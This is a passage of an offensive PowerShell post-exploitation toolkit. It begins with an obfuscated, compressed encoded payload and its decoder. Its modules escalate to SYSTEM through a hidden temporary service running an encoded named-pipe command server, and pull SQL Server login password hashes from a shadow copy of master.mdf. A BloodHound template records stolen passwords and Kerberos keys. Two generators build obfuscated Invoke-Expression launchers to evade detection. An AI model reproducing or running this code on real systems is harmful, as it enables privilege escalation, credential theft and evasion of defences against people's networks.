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' )  ),   ${0`DS7}::"dE`cO`mpReSS"   )|   &('%'){ &  ( 'n' +  'eW-O'  +'bJeCT' )  ( 'IO.StrE'  +  'AmrE'  + 'AdER')( ${_},  (   &(  'ItE'+  'M' )  ( ( 'vA'  +'RIAB' ) +  'l'+  (  'E'  + ':um'  ) +  'kp'  ))."vAl`Ue"::"aS`CIi"   ) }|    &(  '%'){${_}.( 'r' + 'EaDtOEN'  +'D').Invoke( )}  )  |.(  (    & ('GEt-va' +  'Ri'+ 'a'+  'BLE') (  '*M'  + 'dr*'))."N`Ame"[3,11,2]-JOIn'' )
'@

################################################################################################################
####################################### Module: Elevate ########################################################
################################################################################################################

$Global:LocalElevate = {
    function Invoke-RunAsSystem {
        param (
            [string]$PipeName,
            [string]$ServiceName,
            [string]$Command,
            [string]$Timeout = "10000",
            [int]$Terminate = 300000  # Default to 10000 milliseconds (10 seconds)
        )

        $ErrorActionPreference = "SilentlyContinue"
        $WarningPreference = "SilentlyContinue"
        Set-Variable MaximumHistoryCount 32767

        if (!$PipeName) {
            $randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % { [char]$_ })
            $randomvalue = $randomvalue -join ""
            $PipeName = $randomvalue
        }

        if (!$ServiceName) {
            $randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % { [char]$_ })
            $randomvalue = $randomvalue -join ""
            $ServiceName = "Service_" + $randomvalue
        }

        $ServerScript = @"
`$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream("$PipeName", 'InOut', 1, 'Byte', 'None', 4096, 4096, `$null)
`$tcb={param(`$state);`$state.Close()};
`$tm = New-Object System.Threading.Timer(`$tcb, `$pipeServer, 600000, [System.Threading.Timeout]::Infinite);
`$pipeServer.WaitForConnection()
`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);
`$tm.Dispose();
`$sr = New-Object System.IO.StreamReader(`$pipeServer)
`$sw = New-Object System.IO.StreamWriter(`$pipeServer)
while (`$true) {
    if (-not `$pipeServer.IsConnected) {
        break
    }
    `$command = `$sr.ReadLine()
    if (`$command -eq "exit") {break} 
    else {
        try{
            `$decodedCommand = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$command))
            `$result = Invoke-Expression `$decodedCommand | Out-String
            `$result -split "`n" | ForEach-Object {`$sw.WriteLine(`$_.TrimEnd())}
        } catch {
            `$errorMessage = `$_.Exception.Message
            `$sw.WriteLine(`$errorMessage)
        }
        `$sw.WriteLine("###END###")
        `$sw.Flush()
    }
}
`$pipeServer.Disconnect()
`$pipeServer.Dispose()
"@

        $B64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))

        $arguments = "\\localhost create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $B64ServerScript`""
        $startarguments = "\\localhost start $ServiceName"

        Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
        Start-Sleep -Milliseconds 1000
        Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden

        # Get the current process ID
        $currentPID = $PID

        # Embedded monitoring script
        $monitoringScript = @"
`$serviceToDelete = "$ServiceName" # Name of the service you want to delete
`$TargetServer = "localhost"
`$primaryScriptProcessId = $currentPID
`$terminateAfter = $Terminate  # Time in milliseconds to wait before forcefully terminating

# Timer-based termination after the specified time
Start-Sleep -Milliseconds `$terminateAfter
`$process = Get-Process -Id `$primaryScriptProcessId -ErrorAction SilentlyContinue
if (`$process) {
    Stop-Process -Id `$primaryScriptProcessId -Force
}

# Ensure the service is deleted
`$stoparguments = "\\`$TargetServer delete `$serviceToDelete"
Start-Process sc.exe -ArgumentList `$stoparguments -WindowStyle Hidden
"@

        $b64monitoringScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($monitoringScript))

        # Execute the embedded monitoring script in a hidden window
        $MonitoringProcess = Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -enc $b64monitoringScript" -WindowStyle Hidden -PassThru

        $pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream("localhost", $PipeName, 'InOut')

        try {
            $pipeClient.Connect($Timeout)
        }
        catch [System.TimeoutException] {
            return "Timed Out"
        }
        catch {
            Write-Output "unexpected error"
            Write-Output ""
            return
        }

        $sr = New-Object System.IO.StreamReader($pipeClient)
        $sw = New-Object System.IO.StreamWriter($pipeClient)

        $serverOutput = ""

        # No need to encode $Command again as it is already encoded
        $sw.WriteLine($Command)
        $sw.Flush()
        while ($true) {
            $line = $sr.ReadLine()
            if ($line -eq "###END###") {
                Write-Output $serverOutput.Trim()
                Write-Output ""
                break
            }
            else {
                $serverOutput += "$line`n"
            }
        }

        $stoparguments = "\\localhost delete $ServiceName"
        Start-Process sc.exe -ArgumentList $stoparguments -WindowStyle Hidden
        $pipeClient.Close()
        $pipeClient.Dispose()
        Stop-Process -Id $MonitoringProcess.Id -ErrorAction "SilentlyContinue" -Force
    }

}

################################################################################################################
######################################### Module: MDF ##########################################################
################################################################################################################

$Global:DumpMDF = @'
Function Invoke-MDF {

    $Principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    if (-not ([Security.Principal.WindowsIdentity]::GetCurrent().Name -eq "NT AUTHORITY\SYSTEM" -or $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))) {
    return "[-] Ensure this script is run with administrative privileges."
    
    }

    $MDF_Files = Get-ChildItem -Recurse "C:\Program Files\Microsoft SQL Server\*\MSSQL\DATA\master.mdf" -ErrorAction SilentlyContinue

    if (-not $MDF_Files) {
        Write-Output "No Results"
        return
    }

    $vssOutput = vssadmin create shadow /for=C: | Out-String  
    $shadowPath = $vssOutput | Select-String -Pattern "Shadow Copy Volume Name:\s*(.+)$" | ForEach-Object {
        $_.Matches[0].Groups[1].Value.Trim()
    }

    if (-not $shadowPath) {
        Write-Output "[-] Failed to create a shadow copy."
        return
    }
    else {
    }

    [array]$ShadowFilePaths = @()
    foreach ($MDF_File in $MDF_Files) {
        $shadowFilePath = Join-Path $shadowPath ($MDF_File.FullName -replace "^[A-Za-z]:\\", "")
        $ShadowFilePaths += $shadowFilePath
    }

    foreach ($shadowFilePath in $ShadowFilePaths) {
        $destinationFile = "$env:LOCALAPPDATA\$(Get-Random).mdf"
        Copy-Item -LiteralPath $shadowFilePath -Destination $destinationFile -Force -ErrorAction SilentlyContinue

        if (Test-Path $destinationFile) {
            Write-Output "[+] Database successfully copied to: $destinationFile"
        }
        else {
            Write-Output "[-] Failed to copy the file from: $shadowFilePath"
        }
    }

    $File1 = ""
    $File2 = ""

    try {
        foreach ($file in @($File1, $File2)) {
            $data = [System.Convert]::FromBase64String($file)
            $memoryStream = New-Object System.IO.MemoryStream(, $data)
            $decompressedStream = New-Object System.IO.MemoryStream
            $gzipStream = New-Object System.IO.Compression.GZipStream($memoryStream, [IO.Compression.CompressionMode]::Decompress)
            try {
                $gzipStream.CopyTo($decompressedStream)
            }
            finally {
                $gzipStream.Dispose()
                $memoryStream.Dispose()
            }
            $decompressedStream.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
            [Reflection.Assembly]::Load($decompressedStream.ToArray()) | Out-Null
            $decompressedStream.Dispose()
        }
    }
    catch {
        Write-Error "Failure Loading Assembly files: $($_.Exception.Message)"
        continue
    }

    function Get-MDFHashes {
        [CmdletBinding()]
        param (
            [Parameter(Mandatory = $true)]
            [string]$InputFile
        )
        try {
            $instance = New-Object "OrcaMDF.RawCore.RawDataFile" $InputFile
        }
        catch {
            Write-Error "Unable to open the MDF file: $($_.Exception.Message)"
            return @{}
        }

        try {
            $records = $instance.Pages | Where-Object { $_.Header.ObjectID -eq 34 -and $_.Header.Type -eq 1 } | Select-Object -ExpandProperty Records
            $model = @(
                [OrcaMDF.RawCore.Types.RawType]::Int("id"),
                [OrcaMDF.RawCore.Types.RawType]::Sysname("name")
            )
            $sysxlgns_id = 0
            foreach ($r in $records) {
                try {
                    $row = [OrcaMDF.RawCore.RawColumnParser]::Parse([OrcaMDF.RawCore.Records.RawPrimaryRecord]$r, $model)
                    if ($row.name -eq "sysxlgns") {
                        $sysxlgns_id = $row.id
                    }
                }
                catch {}
            }

            if ($sysxlgns_id -eq 0) {
                Write-Warning "Could not find sysxlgns ObjectID in database"
                return @{}
            }

            $records = $instance.Pages | Where-Object { $_.Header.ObjectID -eq $sysxlgns_id -and $_.Header.Type -eq 1 } | Select-Object -ExpandProperty Records
            $model = @(
                [OrcaMDF.RawCore.Types.RawType]::Int("id"),
                [OrcaMDF.RawCore.Types.RawType]::Sysname("name"),
                [OrcaMDF.RawCore.Types.RawType]::VarBinary("sid"),
                [OrcaMDF.RawCore.Types.RawType]::Int("status"),
                [OrcaMDF.RawCore.Types.RawType]::Char("type", 1),
                [OrcaMDF.RawCore.Types.RawType]::DateTime("crdate"),
                [OrcaMDF.RawCore.Types.RawType]::DateTime("modate"),
                [OrcaMDF.RawCore.Types.RawType]::Sysname("dbname"),
                [OrcaMDF.RawCore.Types.RawType]::Sysname("lang"),
                [OrcaMDF.RawCore.Types.RawType]::VarBinary("pwdhash")
            )

            $results = @{}
            foreach ($r in $records) {
                try {
                    $row = [OrcaMDF.RawCore.RawColumnParser]::Parse([OrcaMDF.RawCore.Records.RawPrimaryRecord]$r, $model)
                    if ($row.pwdhash) {
                        $results[$row.name] = "0x" + [BitConverter]::ToString($row.pwdhash).Replace("-", "")
                    }
                }
                catch {}
            }

            return $results
        }
        finally {
            $instance.Dispose()
        }
    }
    $Copied_MDF_Files = Get-ChildItem -Recurse -Path "$env:localAppData\*.mdf"
    foreach ($Copied_MDF_File in $Copied_MDF_Files) {
    
        Get-MDFHashes -InputFile $Copied_MDF_File.fullName | Sort-Object Name | Format-List
        Start-Sleep -Milliseconds 100
        Remove-Item -Force -Path $Copied_MDF_File -ErrorAction SilentlyContinue
    
    }


    $shadowID = $vssOutput | Select-String -Pattern "Shadow Copy ID:\s*({.*})" | ForEach-Object {
        $_.Matches[0].Groups[1].Value.Trim()
    }

    if ($shadowID) {
        vssadmin delete shadows /shadow=$shadowID /quiet > $null
    }
    else {
        Write-Output "[-] Failed to parse ShadowID for deletion."
    }
}
'@

###############################################################################################################
####################################### Module: BH Queries ####################################################
################################################################################################################

function Create-QueryTemplate {
    try {
        $filePath = "$BloodHound\Query.txt"
        $fileContent = if (Test-Path -Path $filePath) { Get-Content -Path $filePath -Raw } else { "" }

        if (-not $fileContent) {
            $initialContent = @"
FOREACH (Useritem IN [] |
  MERGE (u:User {name: Useritem.uname})
  SET u.owned = true
)

FOREACH (Computeritem IN [] |
  MERGE (c:Computer {name: Computeritem.cname})
  SET c.owned = true
)

FOREACH (Passworditem IN [] |
  MERGE (p:User {name: Passworditem.pname})
  SET p.Password = Passworditem.ppassword
  SET p.owned = true
)

FOREACH (RC4item IN [] |
  MERGE (r:User {name: RC4item.rc4name})
  SET r.RC4 = RC4item.RC4
  SET r.owned = true
)

FOREACH (AES256item IN [] |
  MERGE (a:User {name: AES256item.aesname})
  SET a.AES256 = AES256item.AES256
  SET a.owned = true
)

FOREACH (RDPitem IN [] |
  MERGE (u:User {name: RDPitem.rdpusername})
  MERGE (c:Computer {name: RDPitem.rdpcomputername})
  MERGE (u)-[:CanRDP]->(c)`
  SET u.owned = true
)

FOREACH (AdminToitem IN [] |
  MERGE (u:User {name: AdminToitem.atname})
  MERGE (c:Computer {name: AdminToitem.atcomputername})
  MERGE (u)-[:AdminTo]->(c)
  SET u.owned = true
)

"@
            Set-Content -Path $filePath -Value $initialContent
        }
    }

    Catch {}

}

################ Other


function Out-Compressed {
    [CmdletBinding(DefaultParameterSetName = 'StringInput')]
    Param (
        [Parameter(
            Position = 0, 
            ValueFromPipeline = $true, 
            ParameterSetName = 'ScriptBlock'
        )]
        [ValidateNotNullOrEmpty()]
        [ScriptBlock]
        $ScriptBlock,

        [Parameter(
            Position = 0,
            ParameterSetName = 'StringInput'
        )]
        [ValidateNotNullOrEmpty()]
        [String]
        $StringInput
    )

    switch ($PSCmdlet.ParameterSetName) {
        'ScriptBlock' { $finalString = $ScriptBlock.ToString() }
        'StringInput' { $finalString = $StringInput }
    }

    $ScriptBytes = [Text.Encoding]::ASCII.GetBytes($finalString)
    $CompressedStream = New-Object IO.MemoryStream
    $DeflateStream = New-Object IO.Compression.DeflateStream($CompressedStream, [IO.Compression.CompressionMode]::Compress)
    $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
    $DeflateStream.Dispose()
    $CompressedScriptBytes = $CompressedStream.ToArray()
    $CompressedStream.Dispose()
    $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)

    $StreamReader = Get-Random -Input @('IO.StreamReader', 'System.IO.StreamReader')
    $DeflateStream = Get-Random -Input @('IO.Compression.DeflateStream', 'System.IO.Compression.DeflateStream')
    $MemoryStream = Get-Random -Input @('IO.MemoryStream', 'System.IO.MemoryStream')
    $Convert = Get-Random -Input @('Convert', 'System.Convert')
    $CompressionMode = Get-Random -Input @('IO.Compression.CompressionMode', 'System.IO.Compression.CompressionMode')
    $Encoding = Get-Random -Input @('Text.Encoding', 'System.Text.Encoding')
    $ForEachObject = Get-Random -Input @('ForEach', 'ForEach-Object', '%')

    $StreamReader = ([Char[]]$StreamReader | ForEach-Object {
            $c = $_.ToString().ToLower()
            if (Get-Random -Input @(0..1)) { $c = $c.ToUpper() }
            $c
        }) -Join ''
    $DeflateStream = ([Char[]]$DeflateStream | ForEach-Object {
            $c = $_.ToString().ToLower()
            if (Get-Random -Input @(0..1)) { $c = $c.ToUpper() }
            $c
        }) -Join ''
    $MemoryStream = ([Char[]]$MemoryStream | ForEach-Object {
            $c = $_.ToString().ToLower()
            if (Get-Random -Input @(0..1)) { $c = $c.ToUpper() }
            $c
        }) -Join ''
    $Convert = ([Char[]]$Convert | ForEach-Object {
            $c = $_.ToString().ToLower()
            if (Get-Random -Input @(0..1)) { $c = $c.ToUpper() }
            $c
        }) -Join ''
    $CompressionMode = ([Char[]]$CompressionMode | ForEach-Object {
            $c = $_.ToString().ToLower()
            if (Get-Random -Input @(0..1)) { $c = $c.ToUpper() }
            $c
        }) -Join ''
    $Encoding = ([Char[]]$Encoding | ForEach-Object {
            $c = $_.ToString().ToLower()
            if (Get-Random -Input @(0..1)) { $c = $c.ToUpper() }
            $c
        }) -Join ''
    $NewObject = ([Char[]]'New-Object' | ForEach-Object {
            $c = $_.ToString().ToLower()
            if (Get-Random -Input @(0..1)) { $c = $c.ToUpper() }
            $c
        }) -Join ''
    $FromBase64 = ([Char[]]'FromBase64String' | ForEach-Object {
            $c = $_.ToString().ToLower()
            if (Get-Random -Input @(0..1)) { $c = $c.ToUpper() }
            $c
        }) -Join ''
    $Decompress = ([Char[]]'Decompress' | ForEach-Object {
            $c = $_.ToString().ToLower()
            if (Get-Random -Input @(0..1)) { $c = $c.ToUpper() }
            $c
        }) -Join ''
    $Ascii = ([Char[]]'Ascii' | ForEach-Object {
            $c = $_.ToString().ToLower()
            if (Get-Random -Input @(0..1)) { $c = $c.ToUpper() }
            $c
        }) -Join ''
    $ReadToEnd = ([Char[]]'ReadToEnd' | ForEach-Object {
            $c = $_.ToString().ToLower()
            if (Get-Random -Input @(0..1)) { $c = $c.ToUpper() }
            $c
        }) -Join ''
    $ForEachObject = ([Char[]]$ForEachObject | ForEach-Object {
            $c = $_.ToString().ToLower()
            if (Get-Random -Input @(0..1)) { $c = $c.ToUpper() }
            $c
        }) -Join ''
    $ForEachObject2 = ([Char[]]$ForEachObject | ForEach-Object {
            $c = $_.ToString().ToLower()
            if (Get-Random -Input @(0..1)) { $c = $c.ToUpper() }
            $c
        }) -Join ''

    $Base64 = ' ' * (Get-Random -Input @(0, 1)) + "[$Convert]::$FromBase64(" + ' ' * (Get-Random -Input @(0, 1)) + "'$EncodedCompressedScript'" + ' ' * (Get-Random -Input @(0, 1)) + ")" + ' ' * (Get-Random -Input @(0, 1))
    $DeflateStreamSyntax = ' ' * (Get-Random -Input @(0, 1)) + "$DeflateStream(" + ' ' * (Get-Random -Input @(0, 1)) + "[$MemoryStream]$Base64," + ' ' * (Get-Random -Input @(0, 1)) + "[$CompressionMode]::$Decompress" + ' ' * (Get-Random -Input @(0, 1)) + ")" + ' ' * (Get-Random -Input @(0, 1))

    $NewScriptArray = @()
    $NewScriptArray += "(" + ' ' * (Get-Random -Input @(0, 1)) + "$NewObject " + ' ' * (Get-Random -Input @(0, 1)) + "$StreamReader(" + ' ' * (Get-Random -Input @(0, 1)) + "(" + ' ' * (Get-Random -Input @(0, 1)) + "$NewObject $DeflateStreamSyntax)" + ' ' * (Get-Random -Input @(0, 1)) + "," + ' ' * (Get-Random -Input @(0, 1)) + "[$Encoding]::$Ascii)" + ' ' * (Get-Random -Input @(0, 1)) + ").$ReadToEnd(" + ' ' * (Get-Random -Input @(0, 1)) + ")"
    $NewScriptArray += "(" + ' ' * (Get-Random -Input @(0, 1)) + "$NewObject $DeflateStreamSyntax|" + ' ' * (Get-Random -Input @(0, 1)) + "$ForEachObject" + ' ' * (Get-Random -Input @(0, 1)) + "{" + ' ' * (Get-Random -Input @(0, 1)) + "$NewObject " + ' ' * (Get-Random -Input @(0, 1)) + "$StreamReader(" + ' ' * (Get-Random -Input @(0, 1)) + "`$_" + ' ' * (Get-Random -Input @(0, 1)) + "," + ' ' * (Get-Random -Input @(0, 1)) + "[$Encoding]::$Ascii" + ' ' * (Get-Random -Input @(0, 1)) + ")" + ' ' * (Get-Random -Input @(0, 1)) + "}" + ' ' * (Get-Random -Input @(0, 1)) + ").$ReadToEnd(" + ' ' * (Get-Random -Input @(0, 1)) + ")"
    $NewScriptArray += "(" + ' ' * (Get-Random -Input @(0, 1)) + "$NewObject $DeflateStreamSyntax|" + ' ' * (Get-Random -Input @(0, 1)) + "$ForEachObject" + ' ' * (Get-Random -Input @(0, 1)) + "{" + ' ' * (Get-Random -Input @(0, 1)) + "$NewObject " + ' ' * (Get-Random -Input @(0, 1)) + "$StreamReader(" + ' ' * (Get-Random -Input @(0, 1)) + "`$_" + ' ' * (Get-Random -Input @(0, 1)) + "," + ' ' * (Get-Random -Input @(0, 1)) + "[$Encoding]::$Ascii" + ' ' * (Get-Random -Input @(0, 1)) + ")" + ' ' * (Get-Random -Input @(0, 1)) + "}" + ' ' * (Get-Random -Input @(0, 1)) + "|" + ' ' * (Get-Random -Input @(0, 1)) + "$ForEachObject2" + ' ' * (Get-Random -Input @(0, 1)) + "{" + ' ' * (Get-Random -Input @(0, 1)) + "`$_.$ReadToEnd(" + ' ' * (Get-Random -Input @(0, 1)) + ")" + ' ' * (Get-Random -Input @(0, 1)) + "}" + ' ' * (Get-Random -Input @(0, 1)) + ")"
    $NewScript = (Get-Random -Input $NewScriptArray)

    $InvokeExpressionSyntax = @()
    $InvokeExpressionSyntax += (Get-Random -Input @('IEX', 'Invoke-Expression'))
    $InvocationOperator = (Get-Random -Input @('.', '&')) + ' ' * (Get-Random -Input @(0, 1))
    $InvokeExpressionSyntax += $InvocationOperator + "( `$ShellId[1]+`$ShellId[13]+'x')"
    $InvokeExpressionSyntax += $InvocationOperator + "( `$PSHome[" + (Get-Random -Input @(4, 21)) + "]+`$PSHome[" + (Get-Random -Input @(30, 34)) + "]+'x')"
    $InvokeExpressionSyntax += $InvocationOperator + "( `$env:ComSpec[4," + (Get-Random -Input @(15, 24, 26)) + ",25]-Join'')"
    $InvokeExpressionSyntax += $InvocationOperator + "((" + (Get-Random -Input @('Get-Variable', 'GV', 'Variable')) + " '*mdr*').Name[3,11,2]-Join'')"
    $InvokeExpressionSyntax += $InvocationOperator + "( " + (Get-Random -Input @('$VerbosePreference.ToString()', '([String]$VerbosePreference)')) + "[1,3]+'x'-Join'')"
    $InvokeExpression = (Get-Random -Input $InvokeExpressionSyntax)
    $InvokeExpression = ([Char[]]$InvokeExpression | ForEach-Object {
            $c = $_.ToString().ToLower()
            if (Get-Random -Input @(0..1)) { $c = $c.ToUpper() }
            $c
        }) -Join ''
    $InvokeOptions = @()
    $InvokeOptions += ' ' * (Get-Random -Input @(0, 1)) + $InvokeExpression + ' ' * (Get-Random -Input @(0, 1)) + $NewScript + ' ' * (Get-Random -Input @(0, 1))
    $InvokeOptions += ' ' * (Get-Random -Input @(0, 1)) + $NewScript + ' ' * (Get-Random -Input @(0, 1)) + '|' + ' ' * (Get-Random -Input @(0, 1)) + $InvokeExpression
    $NewScript = (Get-Random -Input $InvokeOptions)
    return $NewScript
}


Function Out-Gzip {
    [CmdletBinding()]
    Param
    (
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $InputString
    )

    Function Get-RandomVariableName {
        $Length = Get-Random -Minimum 30 -Maximum 60
        -join ((65..90) + (97..122) | Get-Random -Count $Length | ForEach-Object { [char]$_ })
    }

    $Base64Var = Get-RandomVariableName
    $BytesVar = Get-RandomVariableName
    $MemoryStreamVar = Get-RandomVariableName
    $DecompressedStreamVar = Get-RandomVariableName
    $GzipStreamVar = Get-RandomVariableName
    $StreamReaderVar = Get-RandomVariableName
    $DecompressedStringVar = Get-RandomVariableName

    $Bytes = [System.Text.Encoding]::UTF8.GetBytes($InputString)

    $CompressedStream = New-Object System.IO.MemoryStream
    $GzipStream = New-Object System.IO.Compression.GZipStream($CompressedStream, [System.IO.Compression.CompressionMode]::Compress)

    try {
        $GzipStream.Write($Bytes, 0, $Bytes.Length)
        $GzipStream.Close()

        $CompressedBase64 = [Convert]::ToBase64String($CompressedStream.ToArray())
    }
    finally {
        $GzipStream.Dispose()
        $CompressedStream.Dispose()
    }

    $DecompressionCommand = @"
`$$Base64Var = '$CompressedBase64'
`$$BytesVar = [System.Convert]::FromBase64String(`$$Base64Var)
`$$MemoryStreamVar = New-Object System.IO.MemoryStream(,`$$BytesVar)
`$$DecompressedStreamVar = New-Object System.IO.MemoryStream
`$$GzipStreamVar = New-Object System.IO.Compression.GZipStream(`$$MemoryStreamVar, [System.IO.Compression.CompressionMode]::Decompress)
